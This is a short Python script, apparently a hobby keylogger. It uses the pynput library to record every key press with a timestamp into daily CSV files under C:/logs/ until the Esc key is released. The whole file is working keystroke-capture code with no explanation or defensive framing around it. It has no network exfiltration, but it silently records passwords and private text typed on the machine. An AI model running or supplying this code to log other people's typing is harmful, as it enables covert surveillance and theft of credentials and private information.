import pynput
import os

from pynput.keyboard import Key, Listener
from datetime import datetime
count = 0
keys=[]


def on_press(key):
    global keys, count
    keys.append(key)
    count+=1
    if count>=1:
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):
    if not os.path.exists("C:/logs/"):
        os.mkdir("C:/logs/")

    with open("C:/logs/"+datetime.now().strftime("%Y-%m-%d")+".csv",'a') as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                f.write(datetime.now().strftime("%H:%M:%S,")+"[space]\n")
            #elif k.find("Key")==-1:
            f.write(datetime.now().strftime("%H:%M:%S,")+k+"\n")

def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
